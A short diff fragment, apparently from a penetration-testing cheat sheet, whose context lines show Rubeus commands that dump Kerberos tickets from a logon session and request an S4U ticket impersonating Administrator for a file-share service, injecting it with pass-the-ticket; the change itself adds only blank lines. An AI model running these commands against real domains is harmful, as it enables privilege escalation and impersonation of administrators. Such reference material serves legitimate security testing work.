@@ -20,3 +20,5 @@ Rubeus.exe dump /luid:0x12d1f7
 # Create a ticket
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
 ```
+
+
